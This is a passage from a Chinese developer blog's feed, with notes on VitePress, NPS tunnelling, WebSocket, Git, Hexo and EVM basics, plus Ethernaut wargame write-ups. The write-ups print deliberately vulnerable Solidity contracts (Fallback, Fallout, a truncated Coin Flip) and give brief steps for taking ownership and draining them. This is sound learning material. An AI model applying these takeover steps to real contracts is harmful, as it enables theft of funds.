    <content type="html"><![CDATA[<h1 id="VitePress-是什么？"><a href="#VitePress-是什么？" class="headerlink" title="VitePress 是什么？"></a>VitePress 是什么？</h1><p>VitePress 不只是一个静态站点生成器，它是一个使用 Vue.js 和 Vite 技术的现代网站构建工具。它结合了 Vite 的快速热重载和 Vue 的反应式特性，为开发者提供了一个非常高效的页面开发和构建流程。这意味着你可以享受到即时的页面更新和极快的构建速度，无论是在开发过程中还是在最终的站点部署时。</p><h2 id="核心架构"><a href="#核心架构" class="headerlink" title="核心架构"></a>核心架构</h2><p>Vite：作为现代前端开发和构建工具，Vite 提供了极快的服务器启动和热模块替换（HMR）。</p><p>Vue.js：用于创建互动式 UI 和前端动态内容。Vue 的组件系统允许你以模块化的方式构建页面。</p><p>Markdown：所有的内容都是用 Markdown 编写的，这使得内容创作变得简单而直观。Markdown 文件可以轻松转换成 HTML，同时支持 Vue 组件，让你可以在文档中嵌入动态内容。</p><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>速度与效率：VitePress 的最大卖点之一是其出色的性能。使用 Vite 作为底层工具，它实现了极快的页面加载和热更新，大大提高了开发效率。</p><p>SEO 友好：虽然是一个单页面应用（SPA）生成器，但 VitePress 生成的页面是 SEO 友好的。它在构建时生成静态 HTML，确保了内容的可索引性。</p><p>静态资源处理：VitePress 提供了先进的静态资源处理能力，包括图片、样式表和 JavaScript 文件的优化。这意味着你可以轻松管理和部署资源，确保网站的快速加载。</p><p>易于定制和扩展：VitePress 的架构设计允许你轻松定制主题和扩展功能。你可以使用 Vue 组件和 Vite 插件来增强你的站点，无论是添加自定义功能还是改进用户界面。</p><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>步骤 1：设置项目结构<br>首先，我们初始化 VitePress 项目。创建一个新的文件夹并运行 npm init vitepress 来安装 VitePress。项目的基本结构将包括：</p><p>docs 文件夹：存放所有文档内容。<br>.vitepress 文件夹：用于存放配置文件和主题组件。<br>index.md：网站的主页内容。</p><p>步骤 2：内容撰写与组织<br>接下来，我们在 docs 文件夹中创建 Markdown 文件来编写文档。为了保持组织性，我们可以按照不同的主题或部门将文档分门别类：</p><p>api 文件夹：存放 API 文档。<br>guides 文件夹：存放各类指南。<br>internal 文件夹：存放内部文档。</p><p>每个文件夹中的文档都会有自己的 README.md，作为该部分的入口点。</p><p>文件管理系统：<br>储存位置管理</p><p>存取安全与权限管理</p><p>版本控制</p><p>操作稽核记录</p><p>文件签入签出与锁定</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;VitePress-是什么？&quot;&gt;&lt;a href=&quot;#VitePress-是什么？&quot; class=&quot;headerlink&quot; title=&quot;VitePress 是什么？&quot;&gt;&lt;/a&gt;VitePress 是什么？&lt;/h1&gt;&lt;p&gt;VitePress 不只是一个静态站点生成器</summary>
      
    
    
    
    
    <category term="-vite -vue -" scheme="https://mulladylex.github.io/project/tags/vite-vue/"/>
    
  </entry>
  
  <entry>
    <title>internal-network-penetration</title>
    <link href="https://mulladylex.github.io/project/2025/07/27/internal-network-penetration/"/>
    <id>https://mulladylex.github.io/project/2025/07/27/internal-network-penetration/</id>
    <published>2025-07-27T02:14:16.000Z</published>
    <updated>2025-07-29T04:04:05.978Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h1><h2 id="了解什么是内网穿透"><a href="#了解什么是内网穿透" class="headerlink" title="了解什么是内网穿透"></a>了解什么是内网穿透</h2><h2 id="安装-NPS-服务端"><a href="#安装-NPS-服务端" class="headerlink" title="安装 NPS 服务端"></a>安装 NPS 服务端</h2><p>NPS 默认的WEB端口为<code>80，443</code>, 如果端口被占用，请修改<code>nps.conf</code>中的<code>http_proxy_port，https_proxy_port</code>为其他端口。 web管理端口默认为8080，服务端启动后，输入：<code>ip:8080</code>即可访问。</p><h2 id="安装-NPS-客户端-NPC"><a href="#安装-NPS-客户端-NPC" class="headerlink" title="安装 NPS 客户端(NPC)"></a>安装 NPS 客户端(NPC)</h2><p>客户端配置有两种方式，无配置文件模式（推荐）<a href></a>，配置文件模式。</p><ul><li>无配置文件模式：点击安装后，输入服务地址、连接密钥，即可启动客户端。不建议修改连接方式和开启TLS参数。</li><li><blockquote><p>如果需要配置多个客户端，直接安装多个即可（注意名字不要重复）。</p></blockquote></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;内网穿透&quot;&gt;&lt;a href=&quot;#内网穿透&quot; class=&quot;headerlink&quot; title=&quot;内网穿透&quot;&gt;&lt;/a&gt;内网穿透&lt;/h1&gt;&lt;h2 id=&quot;了解什么是内网穿透&quot;&gt;&lt;a href=&quot;#了解什么是内网穿透&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://mulladylex.github.io/project/2025/07/15/WebSocket/"/>
    <id>https://mulladylex.github.io/project/2025/07/15/WebSocket/</id>
    <published>2025-07-15T05:15:12.685Z</published>
    <updated>2025-07-15T09:45:37.023Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Constructor"><a href="#Constructor" class="headerlink" title="Constructor"></a>Constructor</h1><p><code>WebSocket()</code></p><p>返回一个WebSocket对象。</p><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><p><code>url</code>: 连接的URL，必须是以ws:&#x2F;&#x2F;，wss:&#x2F;&#x2F;或http:&#x2F;&#x2F;，https:&#x2F;&#x2F;开头的字符串。且不能包含查询字符串或片段标识符。</p><p><code>protocols</code>: 可选参数，指定子协议的字符串或字符串数组。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Constructor&quot;&gt;&lt;a href=&quot;#Constructor&quot; class=&quot;headerlink&quot; title=&quot;Constructor&quot;&gt;&lt;/a&gt;Constructor&lt;/h1&gt;&lt;p&gt;&lt;code&gt;WebSocket()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;返回</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>HelloGit</title>
    <link href="https://mulladylex.github.io/project/2025/03/03/HelloGit/"/>
    <id>https://mulladylex.github.io/project/2025/03/03/HelloGit/</id>
    <published>2025-03-02T17:41:31.000Z</published>
    <updated>2025-07-29T12:50:14.043Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是Git"><a href="#什么是Git" class="headerlink" title="什么是Git"></a>什么是Git</h1><blockquote><p>快查表<br><img src="/project/project/2025/03/03/HelloGit/HelloGit/gitcommand.png" alt="常用指令"></p></blockquote><ul><li>Workspace: 工作区</li><li>Index&#x2F;Stage: 暂存区</li><li>Repository: 本地仓库</li><li>Remote: 远程仓库</li></ul><h1 id="新建代码库"><a href="#新建代码库" class="headerlink" title="新建代码库"></a>新建代码库</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">在当前目录下新建一个git仓库</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git init</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">新建目录并创建仓库</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git init [project-name]</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">在当前目录下下载一个项目和他的代码历史</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> [url]</span><br></code></pre></td></tr></table></figure><h1 id="gitconfig"><a href="#gitconfig" class="headerlink" title="gitconfig"></a>gitconfig</h1><p>Git 的配置文件</p><h1 id="Git-Commit"><a href="#Git-Commit" class="headerlink" title="Git Commit"></a>Git Commit</h1><p>Git 仓库中的每一次提交都是一个快照，它记录了每次提交时的全部文件内容。但不同于将整个目录复制粘贴，它会将当前版本与仓库中上一个版本进行对比，并把所有差异打包到一起作为一个提交记录。与此同时，git 还保存了提交的历史记录，这也是为什么大多数提交记录上都有 parent 节点的原因。对于项目组成员而言，维护提交历史对大家都有好处。</p><h1 id="Git-Branch"><a href="#Git-Branch" class="headerlink" title="Git Branch"></a>Git Branch</h1><p>Git的分支也只是简单地指向某个提交记录，因此，<strong>早建分支！多用分支！</strong>。分支并不会造成存储或内存上的开销，并且按逻辑分解工作到不同的分支要比维护那些特别臃肿的分支简单多了。</p><blockquote><p>在 git 2.23 版本中，引入了 git switch 的新命令，最终会取代 git checkout 。因为 checkout 作为单个命令承载了很多独立的功能。</p></blockquote><h1 id="Git-Merge"><a href="#Git-Merge" class="headerlink" title="Git Merge"></a>Git Merge</h1><p>Git的合并操作会把两个分支的提交记录合并到一起，形成一个新的提交记录。合并操作会把两个分支的冲突部分自动解决，但也有可能会出现合并失败的情况，这时就需要手动解决冲突。</p><p>先看第一种方法： git merge </p><p> git rebase<br>取出一系列的提交记录，“复制”后在另外一个地方逐个的放下去。</p><p> Rebase 的优势是可以创造更线性的提交历史。</p><p>HEAD<br> HEAD 总是指向当前分支名，也就是最新提交的快照。 大多数修改提交树的 git 命令都是从改变HEAD的指向开始的。</p><p>分离的 HEAD 就是让其指向具体的提交记录而非分支名。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;什么是Git&quot;&gt;&lt;a href=&quot;#什么是Git&quot; class=&quot;headerlink&quot; title=&quot;什么是Git&quot;&gt;&lt;/a&gt;什么是Git&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;快查表&lt;br&gt;&lt;img src=&quot;/project/project/2025/03</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://mulladylex.github.io/project/2025/02/28/hexo/"/>
    <id>https://mulladylex.github.io/project/2025/02/28/hexo/</id>
    <published>2025-02-28T09:39:36.558Z</published>
    <updated>2025-02-28T18:46:55.600Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Hexo备忘录"><a href="#Hexo备忘录" class="headerlink" title="Hexo备忘录"></a>Hexo备忘录</h1><p>Hexo是一个基于Node.js的静态博客框架，可以快速搭建个人博客。本文记录了一些常用的Hexo命令及配置。</p><h2 id="Hexo的安装"><a href="#Hexo的安装" class="headerlink" title="Hexo的安装"></a>Hexo的安装</h2><p>需求：</p><ul><li>Node.js(版本建议使用12.0及以上)</li><li>Git</li></ul><p>满足上述的应用程序后即可使用<code>npm</code>安装Hexo。  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">npm install -g hexo-cli</span><br></code></pre></td></tr></table></figure><blockquote><p>如有需要，可以在局部安装<code>hexo</code>包，安装以后，使用<code>npx hexo &lt;command&gt;</code>执行Hexo。</p></blockquote><h2 id="Hexo的常用命令"><a href="#Hexo的常用命令" class="headerlink" title="Hexo的常用命令"></a>Hexo的常用命令</h2><h3 id="hexo的初始化"><a href="#hexo的初始化" class="headerlink" title="hexo的初始化"></a>hexo的初始化</h3><p>在安装hexo完成后，通过执行以下命令在指定文件夹中新建所需的文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">hexo init &lt;folder&gt;</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> &lt;folder&gt;</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">npm install</span><br></code></pre></td></tr></table></figure><p>初始化完成后，你的项目文件将如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.<br>├── _config.yml<br>├── package.json<br>├── scafffolds<br>├── source<br>|   ├── _drafts<br>|   └── _posts<br>└── themes<br></code></pre></td></tr></table></figure><h4 id="config-yml"><a href="#config-yml" class="headerlink" title="_config.yml"></a>_config.yml</h4><p>Hexo的配置文件，主要配置了网站的基本信息，主题，插件等。</p><h4 id="package-json"><a href="#package-json" class="headerlink" title="package.json"></a>package.json</h4><h4 id="scafffolds"><a href="#scafffolds" class="headerlink" title="scafffolds"></a>scafffolds</h4><p>模版文件夹，Hexo的脚手架，用于快速生成文章模板。</p><h4 id="source"><a href="#source" class="headerlink" title="source"></a>source</h4><p>资源文件夹，存放你所有资源的地方。除<code>_post</code>文件夹之外，开头名为<code>_</code>（下划线）的文件、文件夹和隐藏的文件将会被忽略。</p><h4 id="themes"><a href="#themes" class="headerlink" title="themes"></a>themes</h4><p>主题文件夹，能够根据主题来渲染静态页面。</p><h3 id="hexo-new"><a href="#hexo-new" class="headerlink" title="hexo new"></a>hexo new</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ hexo new [layout] &lt;title&gt;<br></code></pre></td></tr></table></figure><p>新建一篇文章，未指定<strong>layout</strong>时，默认使用_config.yml中的default_layout。</p><h3 id="hexo-generate"><a href="#hexo-generate" class="headerlink" title="hexo generate"></a>hexo generate</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ hexo generate<br></code></pre></td></tr></table></figure><p>生成静态文件。</p><h3 id="hexo-publish"><a href="#hexo-publish" class="headerlink" title="hexo publish"></a>hexo publish</h3><h3 id="hexo-server"><a href="#hexo-server" class="headerlink" title="hexo server"></a>hexo server</h3><h3 id="hexo-deploy"><a href="#hexo-deploy" class="headerlink" title="hexo deploy"></a>hexo deploy</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Hexo备忘录&quot;&gt;&lt;a href=&quot;#Hexo备忘录&quot; class=&quot;headerlink&quot; title=&quot;Hexo备忘录&quot;&gt;&lt;/a&gt;Hexo备忘录&lt;/h1&gt;&lt;p&gt;Hexo是一个基于Node.js的静态博客框架，可以快速搭建个人博客。本文记录了一些常用的Hexo命</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>HelloOpcodes</title>
    <link href="https://mulladylex.github.io/project/2025/02/19/Solidity/opcode/"/>
    <id>https://mulladylex.github.io/project/2025/02/19/Solidity/opcode/</id>
    <published>2025-02-19T12:56:56.000Z</published>
    <updated>2025-02-19T13:25:16.315Z</updated>
    
    <content type="html"><![CDATA[<p>&#x2F;&#x2F; TODO：更新EVM基础链接</p><h1 id="Opcode简介"><a href="#Opcode简介" class="headerlink" title="Opcode简介"></a>Opcode简介</h1><p> Opcode 被人们称为操作码，是以太坊智能合约的基本单元。在我们使用高级语言编写的智能合约经过编译后会成为 <strong>bytecode（字节码）</strong> 。然后才能通过这些字节码在 EVM 上执行。而这些字节码中的每一个字节都对应着一个 Opcode 。 EVM 会解析并执行这些 Opcode 以实现合约逻辑。<br>例如我们常见的如下 Opcode :</p><ul><li>STOP：停止执行。</li><li>PUSH1：将一个字节的数据压入堆栈。</li><li>SWAP1: 交换栈顶的前两个元素。</li></ul><p>通过这节内容，你将理解合约中的这些 Opcode 在做什么，那我们现在开始吧。</p><blockquote><p>如果你对 Opcode 在执行操作后对EVM的影响还不了解，可以参考这篇文章：<a href>EVM 基础</a></p></blockquote><h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&amp;#x2F;&amp;#x2F; TODO：更新EVM基础链接&lt;/p&gt;
&lt;h1 id=&quot;Opcode简介&quot;&gt;&lt;a href=&quot;#Opcode简介&quot; class=&quot;headerlink&quot; title=&quot;Opcode简介&quot;&gt;&lt;/a&gt;Opcode简介&lt;/h1&gt;&lt;p&gt; Opcode 被人们</summary>
      
    
    
    
    <category term="solidity" scheme="https://mulladylex.github.io/project/categories/solidity/"/>
    
    
  </entry>
  
  <entry>
    <title>EVM 基础</title>
    <link href="https://mulladylex.github.io/project/2025/02/19/Solidity/evm/"/>
    <id>https://mulladylex.github.io/project/2025/02/19/Solidity/evm/</id>
    <published>2025-02-19T12:56:56.000Z</published>
    <updated>2025-02-19T14:06:36.513Z</updated>
    
    <content type="html"><![CDATA[<p>&#x2F;&#x2F; TODO:添加相关图片</p><h1 id="EVM-基础"><a href="#EVM-基础" class="headerlink" title="EVM 基础"></a>EVM 基础</h1><p>EVM类似于JVM，它是以太坊的核心。EVM的基本架构由堆栈、内存、存储、EVM字节码和燃料费组成。下面让我们逐一了解：</p><h2 id="栈-Stack"><a href="#栈-Stack" class="headerlink" title="栈 Stack"></a>栈 Stack</h2><p>EVM是基于堆栈的，这种“LIFO”（后进先出）的数据结构使得它可以实现高效的计算。</p><p>在EVM中，栈的大小是固定的，最大为1024个元素。每个元素长度为256位（32字节），但是每次操作只会操作栈顶的16个元素。</p><h2 id="内存-Memory"><a href="#内存-Memory" class="headerlink" title="内存 Memory"></a>内存 Memory</h2><p>堆栈的计算高效但是存储有限，因此EVM设计了内存对交易执行期间的数据进行存储和读取。EVM的内存是一个线性寻址存储器，可以理解为一个动态字节数组。</p><p>它支持8 bit 或256 bit的写入（<code>MSTORE8</code>&#x2F;&#x2F;<code>MSTORE</code>），但只支持256 bit 的读取（<code>MLOAD</code>）。</p><blockquote><p>需要注意的是，内存是临时性的：交易开始时，所有位置的值均为0；交易执行期间，值进行更新；交易结束时，所有值被清除，不进行持久化存储。<br>如果需要永久保留数据，就需要花费Gas使用EVM的存储</p></blockquote><h2 id="存储-Storage"><a href="#存储-Storage" class="headerlink" title="存储 Storage"></a>存储 Storage</h2><p>EVM的账户存储是一种映射（mapping，键值对存储），每个键和值都是256 bit的数据，支持256 bit的读、写操作，并且保存在每个合约账户中，持久地保存在区块链上，直到被明确地修改。</p><p>对存储的读取（<code>SLOAD</code>）和写入（<code>SSTORE</code>）都需要gas，且比内存操作更加昂贵。</p><blockquote><p>这样的设计可以防止滥用存储资源。</p></blockquote><h2 id="EVM-字节码"><a href="#EVM-字节码" class="headerlink" title="EVM 字节码"></a>EVM 字节码</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&amp;#x2F;&amp;#x2F; TODO:添加相关图片&lt;/p&gt;
&lt;h1 id=&quot;EVM-基础&quot;&gt;&lt;a href=&quot;#EVM-基础&quot; class=&quot;headerlink&quot; title=&quot;EVM 基础&quot;&gt;&lt;/a&gt;EVM 基础&lt;/h1&gt;&lt;p&gt;EVM类似于JVM，它是以太坊的核心。EVM</summary>
      
    
    
    
    <category term="solidity" scheme="https://mulladylex.github.io/project/categories/solidity/"/>
    
    
  </entry>
  
  <entry>
    <title>Fallback</title>
    <link href="https://mulladylex.github.io/project/2023/11/15/Ethernaut/fallback/"/>
    <id>https://mulladylex.github.io/project/2023/11/15/Ethernaut/fallback/</id>
    <published>2023-11-15T12:44:02.000Z</published>
    <updated>2023-11-15T08:27:51.873Z</updated>
    
    <content type="html"><![CDATA[<p>任务要求：获取合约的所有权；将余额减为零<br><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs s">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Fallback &#123;<br><br>  mapping(address =&gt; uint) public contributions;<br>  address public owner;<br><br>  constructor() &#123;<br>    owner = msg.sender;<br>    contributions[msg.sender] = 1000 * (1 ether);<br>  &#125;<br><br>  modifier onlyOwner &#123;<br>        require(<br>            msg.sender == owner,<br>            &quot;caller is not the owner&quot;<br>        );<br>        _;<br>    &#125;<br><br>  function contribute() public payable &#123;<br>    require(msg.value &lt; 0.001 ether);<br>    contributions[msg.sender] += msg.value;<br>    if(contributions[msg.sender] &gt; contributions[owner]) &#123;<br>      owner = msg.sender;<br>    &#125;<br>  &#125;<br><br>  function getContribution() public view returns (uint) &#123;<br>    return contributions[msg.sender];<br>  &#125;<br><br>  function withdraw() public onlyOwner &#123;<br>    payable(owner).transfer(address(this).balance);<br>  &#125;<br><br>  receive() external payable &#123;<br>    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);<br>    owner = msg.sender;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>解题点：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs s">receive() external payable &#123;<br>  require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);<br>  owner = msg.sender;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过标记owner变量快速查询有关获取合约的所有权的代码。</p><p>在receive方法中我们能够更改owner，在此之前需要我们在contributions中有一点余额，这只需要执行contribute方法就能实现。</p><p>解题参考：<br>1）执行实例中的<code>contribute()</code>，向合约发送最多<code>0.001 ether</code>。<br>2）向合约发送以太，触发<code>receive()</code>。<br>3）执行实例中的<code>withdraw()</code>。</p><blockquote><p>receive()</p><ul><li>一个合约至多含有一个receive()函数,</li><li>没有function关键字、没有参数，没有返回值</li><li>可见性必须声明为external，必须含有payable关键字</li><li>允许使用modifier修改器</li></ul><p>当本合约收到ether但并未被调用任何函数，未接受任何数据，<code>receive()</code>被触发，执行ether的传输（类似于基本的<code>send(),transfer()</code>）；如果合约中不存在此类方法，但拥有一个可支付的回退函数将触发回退函数执行ether的操作；如果都不存在，那么合约将不能接受ether并抛出异常</p><p>选自<a href="https://docs.soliditylang.org/en/v0.8.13/contracts.html#receive-ether-function">solidity官方文档v0.8.13</a></p></blockquote><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;任务要求：获取合约的所有权；将余额减为零&lt;br&gt;&lt;strong&gt;源代码：&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;lin</summary>
      
    
    
    
    <category term="Ethernaut" scheme="https://mulladylex.github.io/project/categories/Ethernaut/"/>
    
    
    <category term="题解" scheme="https://mulladylex.github.io/project/tags/%E9%A2%98%E8%A7%A3/"/>
    
    <category term="Ethereum" scheme="https://mulladylex.github.io/project/tags/Ethereum/"/>
    
  </entry>
  
  <entry>
    <title>Fallout</title>
    <link href="https://mulladylex.github.io/project/2023/11/15/Ethernaut/fallout/"/>
    <id>https://mulladylex.github.io/project/2023/11/15/Ethernaut/fallout/</id>
    <published>2023-11-15T12:44:02.000Z</published>
    <updated>2023-11-15T08:32:21.592Z</updated>
    
    <content type="html"><![CDATA[<p>任务要求：获取合约的所有权</p><p><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs s">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;<br><br>contract Fallout &#123;<br>  <br>  using SafeMath for uint256;<br>  mapping (address =&gt; uint) allocations;<br>  address payable public owner;<br><br><br>  /* constructor */<br>  function Fal1out() public payable &#123;<br>    owner = msg.sender;<br>    allocations[owner] = msg.value;<br>  &#125;<br><br>  modifier onlyOwner &#123;<br>        require(<br>            msg.sender == owner,<br>            &quot;caller is not the owner&quot;<br>        );<br>        _;<br>    &#125;<br><br>  function allocate() public payable &#123;<br>    allocations[msg.sender] = allocations[msg.sender].add(msg.value);<br>  &#125;<br><br>  function sendAllocation(address payable allocator) public &#123;<br>    require(allocations[allocator] &gt; 0);<br>    allocator.transfer(allocations[allocator]);<br>  &#125;<br><br>  function collectAllocations() public onlyOwner &#123;<br>    msg.sender.transfer(address(this).balance);<br>  &#125;<br><br>  function allocatorBalance(address allocator) public view returns (uint) &#123;<br>    return allocations[allocator];<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>解题点：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs s">contract Fallout is Ownable &#123;...<br><br>function Fal1out() public payable &#123;...<br></code></pre></td></tr></table></figure><p>注意solidity版本为0.6，这意味着该合约的构造函数是由<code>function 合约名</code>实现的，而在此合约中作为构造函数其名称居然与合约名称不一致，使其成为了任何人都可以执行的公共函数</p><blockquote><p>在solidity 0.4.22版本及其之后中使用function声明构造函数的方法被舍弃，而采用了使用关键字constructor来声明构造函数。</p><blockquote><p>这是在使用编译器0.4.22之前的版本时所需注意的</p></blockquote></blockquote><p>参考：直接调用<code>Fal1out()</code></p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;任务要求：获取合约的所有权&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;源代码：&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;</summary>
      
    
    
    
    <category term="Ethernaut" scheme="https://mulladylex.github.io/project/categories/Ethernaut/"/>
    
    
    <category term="题解" scheme="https://mulladylex.github.io/project/tags/%E9%A2%98%E8%A7%A3/"/>
    
    <category term="Ethereum" scheme="https://mulladylex.github.io/project/tags/Ethereum/"/>
    
  </entry>
  
  <entry>
    <title>Coin Flip</title>
    <link href="https://mulladylex.github.io/project/2023/11/15/Ethernaut/coinflip/"/>
    <id>https://mulladylex.github.io/project/2023/11/15/Ethernaut/coinflip/</id>
    <published>2023-11-15T12:44:02.000Z</published>
    <updated>2023-11-15T08:34:20.534Z</updated>
    
    <content type="html"><![CDATA[<p>任务要求：连续猜对硬币的正反面十次。<del>区区千分之一的运气我也不是没有</del>  </p><p><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs s">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract CoinFlip &#123;<br><br>  uint256 public consecutiveWins;<br>  uint256 lastHash;<br>  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;<br><br>  constructor() &#123;<br>    consecutiveWins = 0;<br>  &#125;<br><br>  function flip(bool _guess) public returns (bool) &#123;<br>    uint256 blockValue = uint256(blockhash(block.number - 1));<br><br>    if (lastHash == blockValue) &#123;<br>      revert();<br>    &#125;<br><br>    lastHash = blockValue;<br>    uint256 coinFlip = blockValue / FACTOR;<br>    bool side = coinFlip == 1 ? true : false;<br><br>    if (side == _guess) &#123;<br>      consecutiveWins++;<br>      return true;<br>    &#125; else &#123;<br>      consecutiveWins = 0;<br>      return false;<br>    &#125;<br>  